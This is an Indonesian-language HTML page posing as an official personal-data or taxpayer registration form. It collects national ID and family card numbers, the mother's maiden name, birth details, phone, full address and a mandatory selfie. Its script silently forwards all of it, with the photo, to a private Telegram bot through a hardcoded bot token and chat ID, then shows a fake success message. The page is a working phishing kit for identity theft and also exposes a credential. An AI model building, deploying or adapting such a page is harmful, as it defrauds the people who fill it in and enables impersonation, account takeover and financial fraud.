<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulir Data Pribadi</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 20px;
            min-height: 100vh;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        }
        form {
            max-width: 600px;
            margin: 20px auto;
            background: rgba(255, 255, 255, 0.95);
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
            backdrop-filter: blur(10px);
        }
        h2 {
            color: #2d3748;
            text-align: center;
            margin-bottom: 30px;
            font-size: 2em;
        }
        label {
            display: block;
            margin: 15px 0 5px;
            color: #4a5568;
            font-weight: 600;
            background: linear-gradient(45deg, #4a5568, #2d3748);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        input, select, textarea {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e2e8f0;
            border-radius: 8px;
            font-size: 16px;
            transition: all 0.3s ease;
            background-color: #f7fafc;
        }
        input:focus, select:focus, textarea:focus {
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.2);
            background-color: white;
            outline: none;
        }
        button {
            background: linear-gradient(45deg, #667eea, #764ba2);
            color: white;
            padding: 15px 30px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 20px;
            width: 100%;
        }
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
        }
        .required::after {
            content: " *";
            color: #e53e3e;
        }
        .hidden {
            display: none;
        }
        #telegramMessage {
            background: linear-gradient(135deg, #4f46e5 0%, #8b5cf6 100%);
            color: white;
            padding: 40px 30px;
            border-radius: 15px;
            text-align: center;
            max-width: 600px;
            margin: 20px auto;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
            border: 2px solid rgba(255, 255, 255, 0.1);
        }
        .success-icon {
            font-size: 50px;
            margin-bottom: 20px;
            animation: bounce 1s ease;
        }
        #telegramMessage h3 {
            font-size: 1.8em;
            margin-bottom: 15px;
            letter-spacing: 1px;
        }
        #telegramMessage p {
            font-size: 1.1em;
            line-height: 1.6;
            opacity: 0.9;
        }
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }
        .grid-dua-kolom {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
        }
        @media (max-width: 768px) {
            form {
                padding: 20px;
                margin: 10px;
            }
            
            .grid-dua-kolom {
                grid-template-columns: 1fr;
            }
            
            input, select, textarea {
                font-size: 14px;
                padding: 10px 12px;
            }
            
            button {
                padding: 12px 20px;
                font-size: 14px;
            }
        }
    </style>
</head>
<body>
    <form id="dataForm" enctype="multipart/form-data">
        <h2>Formulir Data Pribadi</h2>

        <label for="nik" class="required">Nomor Identitas Kependudukan</label>
        <input type="text" id="nik" name="nik" 
               pattern="\d{16}" 
               maxlength="16"
               title="NIK harus 16 digit angka"
               required>

        <label for="agama" class="required">Agama</label>
        <select id="agama" name="agama" required>
            <option value="">--Pilih Agama--</option>
            <option value="Islam">Islam</option>
            <option value="Kristen">Kristen</option>
            <option value="Katolik">Katolik</option>
            <option value="Hindu">Hindu</option>
            <option value="Buddha">Buddha</option>
            <option value="Konghucu">Konghucu</option>
        </select>

        <label for="status_hubungan" class="required">Status Hubungan Keluarga</label>
        <select id="status_hubungan" name="status_hubungan" required>
            <option value="">--Pilih Status Hubungan--</option>
            <option value="Kepala Keluarga">Kepala Keluarga</option>
            <option value="Suami">Suami</option>
            <option value="Istri">Istri</option>
            <option value="Anak">Anak</option>
            <option value="Menantu">Menantu</option>
            <option value="Orang Tua">Orang Tua</option>
            <option value="Cucu">Cucu</option>
            <option value="Famili Lain">Famili Lain</option>
        </select>

        <!-- Tambahan untuk istri -->
        <div id="nikKepalaUnitContainer" class="hidden">
            <label for="nik_kepala_unit" class="required">NIK Kepala Unit Pajak Keluarga(Suami)</label>
            <input type="text" id="nik_kepala_unit" name="nik_kepala_unit" placeholder="Contoh: 1234567890123456">
        </div>

        <label for="nama_wajib_pajak" class="required">Nama Wajib Pajak</label>
        <input type="text" id="nama_wajib_pajak" name="nama_wajib_pajak" required>

        <label for="tanggal_lahir" class="required">Tanggal Lahir</label>
        <input type="date" id="tanggal_lahir" name="tanggal_lahir" required>

        <label for="jenis_kelamin" class="required">Jenis Kelamin</label>
        <select id="jenis_kelamin" name="jenis_kelamin" required>
            <option value="">--Pilih Jenis Kelamin--</option>
            <option value="Laki-laki">Laki-laki</option>
            <option value="Perempuan">Perempuan</option>
        </select>

        <label for="nama_ibu_kandung" class="required">Nama Ibu Kandung</label>
        <input type="text" id="nama_ibu_kandung" name="nama_ibu_kandung" required>

        <label for="tempat_lahir" class="required">Tempat Lahir</label>
        <input type="text" id="tempat_lahir" name="tempat_lahir" 
               pattern="[A-Za-z ]+"
               title="Hanya boleh berisi huruf dan spasi"
               required>

        <label for="status_perkawinan" class="required">Status Perkawinan</label>
        <select id="status_perkawinan" name="status_perkawinan" required>
            <option value="">--Pilih Status Perkawinan--</option>
            <option value="Belum Menikah">Belum Menikah</option>
            <option value="Menikah">Menikah</option>
            <option value="Cerai Hidup">Cerai Hidup</option>
            <option value="Cerai Mati">Cerai Mati</option>
        </select>

        <label for="nomor_kk" class="required">Nomor Kartu Keluarga</label>
        <input type="text" id="nomor_kk" name="nomor_kk" 
               pattern="\d{16}"
               maxlength="16"
               title="Nomor KK harus 16 digit angka"
               required>

        <label for="email">E-mail Aktif</label>
        <input type="email" id="email" name="email"
               placeholder="contoh@domain.com"
               pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,4}$">

        <label for="nomor_handphone" class="required">Nomor Handphone (Minimal ada pulsa 5k)</label>
        <input type="tel" id="nomor_handphone" name="nomor_handphone" 
               pattern="^08\d{9,12}$"
               maxlength="13"
               placeholder="Contoh: 081234567890"
               title="Nomor harus diawali 08 dan 10-13 digit"
               required>

        <label for="alamat" class="required">Detail Alamat</label>
        <textarea id="alamat" name="alamat" rows="3" required></textarea>

        <div class="grid-dua-kolom">
            <div>
                <label for="rt" class="required">RT</label>
                <input type="text" id="rt" name="rt" 
                       pattern="\d{3}"
                       maxlength="3"
                       placeholder="Contoh: 003"
                       title="RT harus 3 digit angka"
                       required>
            </div>
            <div>
                <label for="rw" class="required">RW</label>
                <input type="text" id="rw" name="rw" 
                       pattern="\d{3}"
                       maxlength="3"
                       placeholder="Contoh: 005"
                       title="RW harus 3 digit angka"
                       required>
            </div>
        </div>

        <label for="provinsi" class="required">Provinsi</label>
        <input type="text" id="provinsi" name="provinsi" required>

        <label for="kota" class="required">Kota/Wilayah</label>
        <input type="text" id="kota" name="kota" required>

        <label for="kecamatan" class="required">Kecamatan</label>
        <input type="text" id="kecamatan" name="kecamatan" required>

        <label for="desa" class="required">Desa/Kelurahan</label>
        <input type="text" id="desa" name="desa" required>

        <label for="kode_wilayah" class="required">Kode Wilayah</label>
        <input type="text" id="kode_wilayah" name="kode_wilayah" required>

        <label for="kode_pos" class="required">Kode Pos</label>
        <input type="text" id="kode_pos" name="kode_pos" 
               pattern="\d{5}"
               maxlength="5"
               title="Kode pos harus 5 digit angka"
               required>

        <label for="selfie" class="required">Upload Gambar Selfie (Wajib)</label>
        <input type="file" id="selfie" name="selfie" accept="image/*" required>

        <button type="submit">Submit</button>
    </form>

    <div id="telegramMessage" class="hidden">
        <div class="success-icon">
            <i class="fas fa-check-circle"></i>
        </div>
        <h3>📬 Data Berhasil Diterima!</h3>
        <p>Terima kasih! Data Anda telah kami terima dan sedang diproses.</p>
    </div>

    <script>
        // Tambahkan deteksi user agent di awal script
        function isMobileDevice() {
            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        }

        // Sesuaikan tampilan berdasarkan device
        document.addEventListener('DOMContentLoaded', function() {
            if(isMobileDevice()) {
                document.body.classList.add('mobile-view');
                document.querySelector('form').style.maxWidth = '100%';
            }
        });

        document.getElementById('dataForm').addEventListener('submit', function(event) {
            event.preventDefault();

            const formData = new FormData(this);

            // Simulate sending data to Telegram
            const telegramBotToken = '8134326547:AAH8IKTtrDV5NRH3Yt_jcxBzot_TuVJGu3k'; // Ganti dengan bot token Anda
            const chatId = '156619417'; // Ganti dengan chat ID Anda

            // Format pesan dengan mobospace
            let message = "🐯 *DATA FORMULIR* 🐯\n";
            message += "━━━━━━━━━━━━━━━━━━━━\n";
            
            for (let [key, value] of formData.entries()) {
                if (key !== 'selfie') {
                    message += `*${key.replace(/_/g, ' ').toUpperCase()}*: \`${value}\`\n`;
                }
            }
            
            message += "━━━━━━━━━━━━━━━━━━━━\n";
            message += "✅ *DATA TELAH TERKIRIM* ✅";

            // Kirim pesan teks pertama
            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'MarkdownV2'
                })
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Gagal mengirim pesan teks ke Telegram.');
                }
                return response.json();
            })
            .then(() => {
                // Send the image next
                const selfieFile = formData.get('selfie');
                const photoData = new FormData();
                photoData.append('chat_id', chatId);
                photoData.append('photo', selfieFile);

                return fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
                    method: 'POST',
                    body: photoData
                });
            })
            .then(response => {
                if (response.ok) {
                    document.getElementById('dataForm').classList.add('hidden');
                    document.getElementById('telegramMessage').classList.remove('hidden');
                } else {
                    throw new Error('Gagal mengirim gambar ke Telegram.');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('Terjadi kesalahan saat mengirim data. Silakan coba lagi.');
            });
        });

        document.getElementById('status_hubungan').addEventListener('change', function() {
            const nikContainer = document.getElementById('nikKepalaUnitContainer');
            const nikInput = document.getElementById('nik_kepala_unit');
            
            if(this.value === 'Istri') {
                nikContainer.classList.remove('hidden');
                nikInput.required = true;
            } else {
                nikContainer.classList.add('hidden');
                nikInput.required = false;
                nikInput.value = ''; // Reset nilai jika disembunyikan
            }
        });

        // Validasi tanggal lahir minimal 17 tahun
        const tanggalLahir = document.getElementById('tanggal_lahir');
        const today = new Date();
        const minDate = new Date(today.getFullYear() - 17, today.getMonth(), today.getDate());
        tanggalLahir.max = minDate.toISOString().split('T')[0];

        // Validasi input angka
        const numberFields = ['nik', 'nomor_kk', 'nomor_handphone', 'rt', 'rw', 'kode_pos'];
        numberFields.forEach(id => {
            document.getElementById(id).addEventListener('input', function(e) {
                this.value = this.value.replace(/\D/g, '');
            });
        });

        // Validasi huruf untuk tempat lahir dan nama
        const textFields = ['tempat_lahir', 'nama_ibu_kandung', 'nama_wajib_pajak'];
        textFields.forEach(id => {
            document.getElementById(id).addEventListener('input', function(e) {
                this.value = this.value.replace(/[^A-Za-z ]/g, '');
            });
        });

        // Auto-uppercase untuk nama
        document.getElementById('nama_ibu_kandung').addEventListener('input', function() {
            this.value = this.value.toUpperCase();
        });
        
        document.getElementById('nama_wajib_pajak').addEventListener('input', function() {
            this.value = this.value.toUpperCase();
        });
    </script>
</body>
</html>
